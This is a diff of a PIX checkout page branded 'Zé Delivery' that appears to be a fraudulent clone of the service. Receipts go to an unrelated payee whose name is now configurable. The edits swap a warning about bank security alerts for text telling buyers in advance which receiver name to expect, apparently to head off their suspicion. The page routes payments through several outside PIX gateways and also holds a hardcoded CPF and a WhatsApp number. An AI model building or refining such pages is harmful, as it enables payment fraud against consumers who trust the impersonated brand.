@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Carrinho - Zé Delivery</title>
+  <script src="js/config.js"></script>
   <!-- Meta Pixel Code -->
   <script>
   !function(f,b,e,v,n,t,s)
@@ -141,7 +142,7 @@
     .c-pagar-btn:disabled { opacity: .4; cursor: default; }
     .c-continue-btn { background: none; border: none; cursor: pointer; font-family: 'Poppins', sans-serif; font-size: 13px; font-weight: 600; color: #888; text-decoration: underline; text-align: center; padding: 2px 0; }
     .c-continue-btn:hover { color: #555; }
-    .c-spacer { height: 175px; }
+    .c-spacer { height: 220px; }
 
     /* ══════════════════════════════
        MODAL CPF
@@ -278,11 +279,14 @@
 
   <!-- ══ BOTÃO REALIZAR PAGAMENTO ══ -->
   <div class="c-bottom">
-    <div class="px-aviso">
-      <div class="px-aviso-row">
-        <span class="px-aviso-icon">🏦</span>
-        <div class="px-aviso-text">O recebedor que aparecerá no seu banco será <strong>COMPRA GARANTIDA BR LTDA</strong>, nossa operadora financeira parceira.</div>
+    <!-- Bloco recebedor PIX -->
+    <div style="display:flex;align-items:center;gap:10px;background:#f7f7f7;border-radius:10px;padding:10px 12px;margin-bottom:8px;">
+      <img src="images/pix-logo.png" alt="PIX" style="width:22px;height:22px;flex-shrink:0;object-fit:contain;">
+      <div style="flex:1;min-width:0;line-height:1.4;">
+        <div style="font-size:11px;color:#888;">Pagamento via PIX processado por</div>
+        <div style="font-size:12.5px;font-weight:700;color:#1a1a1a;"><span class="ze-nome-recebedor"></span> <span style="font-weight:400;color:#888;">· <span class="ze-instituicao"></span></span></div>
       </div>
+      <i class="fa fa-shield-halved" style="color:#077c22;font-size:16px;flex-shrink:0;"></i>
     </div>
     <button class="c-pagar-btn" id="c-btn-pagar" onclick="iniciarPagamento()" disabled>
       <i class="fa fa-lock" style="font-size:13px"></i>
@@ -361,10 +365,6 @@
         </div>
         <input id="cpf-input" class="cpf-input" type="text" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
         <span id="cpf-err" class="cpf-err"></span>
-        <div class="cpf-check-row">
-          <input type="checkbox" id="cpf-nao-sei" onchange="toggleCpfInput(this)">
-          <label for="cpf-nao-sei">Não lembro meu CPF</label>
-        </div>
         <button class="cpf-confirm-btn" id="cpf-confirm-btn" onclick="confirmarCpf()">
           <i class="fa fa-lock" style="font-size:12px"></i> Salvar e pagar
         </button>
@@ -385,13 +385,14 @@
       <div class="pix-content">
 
         <div class="pix-card">
-          <!-- Aviso alerta de banco -->
-          <div class="px-aviso" style="margin-bottom:14px">
-            <div class="px-aviso-row">
-              <span class="px-aviso-icon">🔒</span>
-              <div class="px-aviso-text">
-                Alguns bancos exibem alertas de segurança automáticos em compras online com alto volume de pedidos. O beneficiário <strong>COMPRA GARANTIDA BR LTDA</strong> é nossa operadora parceira e seu pedido está garantido. ✅
-              </div>
+
+          <!-- Recebedor — prepara o cliente antes de abrir o banco -->
+          <div style="background:#f0faf3;border:1.5px solid #b8eac7;border-radius:10px;padding:11px 14px;margin-bottom:16px;display:flex;align-items:flex-start;gap:10px;">
+            <i class="fa fa-circle-check" style="color:#077c22;font-size:15px;margin-top:1px;flex-shrink:0"></i>
+            <div style="font-size:12.5px;color:#1a4a2a;line-height:1.55;">
+              <strong style="display:block;margin-bottom:2px;">Pedido reservado — aguardando confirmação do pagamento.</strong>
+              Confira o nome do recebedor, ele deverá ser:<br>
+              <strong><span class="ze-nome-recebedor"></span></strong> · <span style="color:#555;"><span class="ze-instituicao"></span></span>
             </div>
           </div>
 
@@ -419,16 +420,30 @@
         <div class="px-status" id="px-status-card">
           <div class="px-status-icon" id="px-status-icon">⏳</div>
           <div>
-            <div class="px-status-text" id="px-status-text">Aguardando pagamento...</div>
-            <div class="px-status-sub"  id="px-status-sub">Verificando automaticamente</div>
+            <div class="px-status-text" id="px-status-text">Aguardando seu pagamento...</div>
+            <div class="px-status-sub" id="px-status-sub">Confirmação automática — sem precisar avisar</div>
           </div>
+        </div>
+
+        <!-- WhatsApp após PIX gerado -->
+        <div style="background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 1px 5px rgba(0,0,0,.07);display:flex;align-items:center;gap:14px;">
+          <div style="width:40px;height:40px;border-radius:50%;background:#25d366;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+            <i class="fab fa-whatsapp" style="color:#fff;font-size:20px;"></i>
+          </div>
+          <div style="flex:1;min-width:0;">
+            <div style="font-size:13px;font-weight:700;color:#1a1a1a;margin-bottom:2px;">Já pagou? Mande o comprovante</div>
+            <div style="font-size:12px;color:#888;line-height:1.4;">Agiliza a confirmação do seu pedido</div>
+          </div>
+          <a href="https://wa.me/5511917254664?text=Ol%C3%A1%2C+acabei+de+pagar+meu+pedido+e+quero+enviar+o+comprovante." target="_blank" rel="noopener" style="background:#25d366;color:#fff;border:none;border-radius:20px;padding:9px 16px;font-family:'Poppins',sans-serif;font-size:12px;font-weight:700;cursor:pointer;text-decoration:none;white-space:nowrap;display:flex;align-items:center;gap:5px;">
+            <i class="fab fa-whatsapp"></i> Enviar
+          </a>
         </div>
 
         <div class="pix-card">
           <div class="px-instr-title">Como realizar o pagamento</div>
-          <div class="px-step"><div class="px-step-num">1</div><div><div class="px-step-title">Copie o código PIX</div><div class="px-step-sub">Clique no código ou no botão acima</div></div></div>
-          <div class="px-step"><div class="px-step-num">2</div><div><div class="px-step-title">Abra o app do banco</div><div class="px-step-sub">Escolha PIX → Pix Copia e Cola</div></div></div>
-          <div class="px-step"><div class="px-step-num">3</div><div><div class="px-step-title">Cole e confirme o pagamento</div><div class="px-step-sub">Verifique o valor antes de finalizar</div></div></div>
+          <div class="px-step"><div class="px-step-num">1</div><div><div class="px-step-title">Copie o código PIX acima</div><div class="px-step-sub">Clique no código ou no botão "Copiar"</div></div></div>
+          <div class="px-step"><div class="px-step-num">2</div><div><div class="px-step-title">Abra o app do seu banco</div><div class="px-step-sub">Vá em PIX → Pix Copia e Cola e cole o código</div></div></div>
+          <div class="px-step"><div class="px-step-num">3</div><div><div class="px-step-title">Confirme para <strong><span class="ze-nome-recebedor"></span></strong></div><div class="px-step-sub">Verifique o valor e finalize. Seu pedido é aprovado na hora.</div></div></div>
         </div>
 
       </div>
@@ -437,6 +452,10 @@
 
   <script src="js/produtos.js"></script>
   <script src="js/carrinho-data.js"></script>
+  <script>
+    document.querySelectorAll('.ze-nome-recebedor').forEach(el => el.textContent = ZE_CONFIG.nomeRecebedor);
+    document.querySelectorAll('.ze-instituicao').forEach(el => el.textContent = ZE_CONFIG.instituicao);
+  </script>
   <script>
     /* ══ CONSTANTES ══ */
     var ZE_OWNER_CPF = '056.718.976-70';
@@ -616,20 +635,29 @@
         subtotalRef += ((pr&&pr.precoAntigo)?pr.precoAntigo:it.preco)*it.quantidade;
       }
       var desc = subtotalRef - total;
+      /* Bloco de entrega — acima do resumo */
+      var blocoEntrega = '<div style="background:#fff;border-radius:14px;margin:10px 12px 0;padding:14px 16px;box-shadow:0 1px 4px rgba(0,0,0,.07);display:flex;align-items:center;gap:12px;">'
+        +'<div style="width:38px;height:38px;border-radius:50%;background:#fff3c4;border:1.5px solid #ffcc01;display:flex;align-items:center;justify-content:center;flex-shrink:0;">'
+        +'<i class="fa fa-motorcycle" style="color:#1a1a1a;font-size:15px;"></i></div>'
+        +'<div style="flex:1;min-width:0;">'
+        +'<div style="font-size:13px;font-weight:700;color:#1a1a1a;line-height:1.3;">Prazo de entrega: 30–40 min</div>'
+        +'<div style="font-size:12px;color:#888;margin-top:2px;line-height:1.4;">Direto na sua porta, gelado.</div>'
+        +'</div>'
+        +'</div>';
+
       var resumo = '<div class="c-summary">'
         +'<div class="c-sum-row"><span>Subtotal</span><span>'+fmt(subtotalRef)+'</span></div>'
         +'<div class="c-sum-row"><span>Taxa de entrega</span><span class="c-sum-green">Grátis</span></div>'
         +(desc>0.005?'<div class="c-sum-row"><span>Economia no PIX</span><span class="c-sum-green" style="font-weight:400">– '+fmt(desc)+'</span></div>':'')
         +'<div class="c-sum-divider"></div>'
         +'<div class="c-sum-total"><span>Total</span><span>'+fmt(total)+'</span></div>'
-        +'<div class="c-pix-block"><img src="images/pix-logo.png" alt="PIX" style="width:26px;height:26px;flex-shrink:0"><div style="flex:1"><div style="font-size:13px;font-weight:700">Pagamento via PIX</div><div style="font-size:12px;color:#888;margin-top:2px">Aprovação instantânea</div></div></div>'
         +'</div>';
 
       var aviso = abaixoMinimo
         ? '<div style="background:#fff8e1;border:1.5px solid #ffcc01;border-radius:12px;padding:13px 15px;margin:10px 12px 0;display:flex;align-items:flex-start;gap:9px"><i class="fa fa-info-circle" style="color:#7a5f00;margin-top:2px;flex-shrink:0;font-size:15px"></i><span style="font-size:13px;color:#7a5f00;font-weight:600;line-height:1.45">Pedido mínimo de <b>R$ 30,00</b>. Adicione mais <b>R$ '+Math.max(0,MIN_PEDIDO-total).toFixed(2).replace('.',',')+'</b> para finalizar.</span></div>'
         : '';
 
-      el.innerHTML = html + infoHtml + resumo + aviso;
+      el.innerHTML = html + infoHtml + blocoEntrega + resumo + aviso;
     }
 
     function changeItemQty(index, delta) { CarrinhoData.setQty(index, CarrinhoData.get().items[index].quantidade + delta); renderCart(); }
@@ -662,8 +690,8 @@
       var el = document.getElementById('cpf-overlay');
       el.style.display = 'flex';
       document.getElementById('cpf-input').value = '';
-      document.getElementById('cpf-nao-sei').checked = false;
-      toggleCpfInput(document.getElementById('cpf-nao-sei'));
+      document.getElementById('cpf-input').disabled = false;
+      document.getElementById('cpf-input').style.opacity = '1';
       document.getElementById('cpf-err').classList.remove('visible');
       document.getElementById('cpf-err').textContent = '';
       setTimeout(function(){ document.getElementById('cpf-input').focus(); }, 300);
@@ -675,16 +703,7 @@
       setTimeout(function(){ document.getElementById('cpf-overlay').style.display = 'none'; sheet.classList.remove('closing'); }, 240);
     }
 
-    function toggleCpfInput(cb) {
-      var inp = document.getElementById('cpf-input');
-      if (cb.checked) {
-        inp.value = ''; inp.disabled = true;
-        inp.placeholder = 'CPF não informado'; inp.style.opacity = '.45';
-        document.getElementById('cpf-err').classList.remove('visible');
-      } else {
-        inp.disabled = false; inp.placeholder = '000.000.000-00'; inp.style.opacity = '1';
-      }
-    }
+    function toggleCpfInput(cb) { /* removido — opção "não lembro" descontinuada */ }
 
     document.getElementById('cpf-input').addEventListener('input', function() {
       var v = this.value.replace(/\D/g,'').slice(0,11);
@@ -697,16 +716,15 @@
     });
 
     async function confirmarCpf() {
-      var naoCpf = document.getElementById('cpf-nao-sei').checked;
-      var cpfRaw = naoCpf ? gerarCpfAleatorio() : document.getElementById('cpf-input').value.replace(/\D/g,'');
+      var cpfRaw = document.getElementById('cpf-input').value.replace(/\D/g,'');
 
-      if (!naoCpf) {
-        if (!cpfValido(cpfRaw)) {
-          document.getElementById('cpf-input').classList.add('error');
-          document.getElementById('cpf-err').textContent = 'CPF inválido — verifique o número e tente novamente.';
-          document.getElementById('cpf-err').classList.add('visible');
-          return;
-        }
+      if (!cpfValido(cpfRaw)) {
+        document.getElementById('cpf-input').classList.add('error');
+        document.getElementById('cpf-err').textContent = cpfRaw.length < 11
+          ? 'Digite os 11 dígitos do CPF.'
+          : 'CPF inválido — verifique o número e tente novamente.';
+        document.getElementById('cpf-err').classList.add('visible');
+        return;
       }
 
       /* Desabilita botão, mostra loading */
@@ -754,8 +772,11 @@
 
       var d       = transacao.data || transacao;
       var pixData = d.pix || {};
-      var pixCode = pixData.qr_code || '';
-      var pixImg  = (pixData.url && pixData.url !== 'null') ? pixData.url : '';
+      /* Bynet usa "qrcode"; Paradise/Freepay usam "qr_code" — suporta ambos */
+      var pixCode = pixData.qrcode || pixData.qr_code || '';
+      var pixImg  = (pixData.receiptUrl && pixData.receiptUrl !== 'null') ? pixData.receiptUrl
+                 : (pixData.url        && pixData.url        !== 'null') ? pixData.url
+                 : '';
       if (pixCode && !pixImg) {
         pixImg = 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(pixCode);
       }
